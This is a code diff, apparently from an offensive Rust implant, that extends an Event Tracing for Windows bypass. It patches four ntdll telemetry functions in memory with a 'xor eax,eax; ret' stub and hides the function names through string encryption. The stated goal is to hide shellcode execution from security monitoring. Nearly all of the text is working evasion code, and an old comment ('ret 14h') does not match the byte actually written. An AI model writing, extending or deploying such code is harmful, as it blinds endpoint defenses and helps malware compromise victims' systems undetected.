@@ -1,30 +1,40 @@
-//! ETW (Event Tracing for Windows) bypass.
-//!
-//! Patches EtwEventWrite in ntdll.dll to return immediately (ret 14h),
-//! suppressing telemetry events that would reveal shellcode execution.
-
+/// ETW bypass — short-circuits every user-mode ETW entry point in ntdll:
+///   EtwEventWrite, EtwEventWriteFull, EtwEventWriteTransfer, NtTraceEvent
+///
+/// Each is patched to `xor eax,eax; ret` (STATUS_SUCCESS / 0), so telemetry
+/// events are silently dropped before they reach the kernel.
 #[cfg(target_os = "windows")]
 pub fn patch() {
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    use windows_sys::Win32::System::Memory::VirtualProtect;
-    use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
+    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
+
+    // xor eax,eax (31 C0) + ret (C3) — clears eax and returns STATUS_SUCCESS
+    const STUB: [u8; 3] = [0x31, 0xC0, 0xC3];
 
     unsafe {
         let ntdll_n = { let mut v = oxide_macros::encrypt_str!("ntdll.dll").into_bytes(); v.push(0); v };
         let ntdll = GetModuleHandleA(ntdll_n.as_ptr() as _);
         if ntdll == 0 { return; }
 
-        let etw_n = { let mut v = oxide_macros::encrypt_str!("EtwEventWrite").into_bytes(); v.push(0); v };
-        let etw_fn = GetProcAddress(ntdll, etw_n.as_ptr() as _);
-        if etw_fn.is_none() { return; }
+        let fn_names = vec![
+            oxide_macros::encrypt_str!("EtwEventWrite"),
+            oxide_macros::encrypt_str!("EtwEventWriteFull"),
+            oxide_macros::encrypt_str!("EtwEventWriteTransfer"),
+            oxide_macros::encrypt_str!("NtTraceEvent"),
+        ];
 
-        let addr = etw_fn.unwrap() as *mut u8;
-        let mut old = 0u32;
+        for fn_name in &fn_names {
+            let name_cstr: Vec<u8> = { let mut v = fn_name.clone().into_bytes(); v.push(0); v };
+            let func = GetProcAddress(ntdll, name_cstr.as_ptr() as _);
+            if func.is_none() { continue; }
 
-        VirtualProtect(addr as _, 1, PAGE_EXECUTE_READWRITE, &mut old);
-        // `ret 14h` on x64 — returns immediately, skipping the event write
-        addr.write(0xC3);
-        VirtualProtect(addr as _, 1, old, &mut old);
+            let addr = func.unwrap() as *mut u8;
+            let mut old = 0u32;
+            if VirtualProtect(addr as _, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old) != 0 {
+                std::ptr::copy_nonoverlapping(STUB.as_ptr(), addr, STUB.len());
+                VirtualProtect(addr as _, STUB.len(), old, &mut old);
+            }
+        }
     }
 }
 
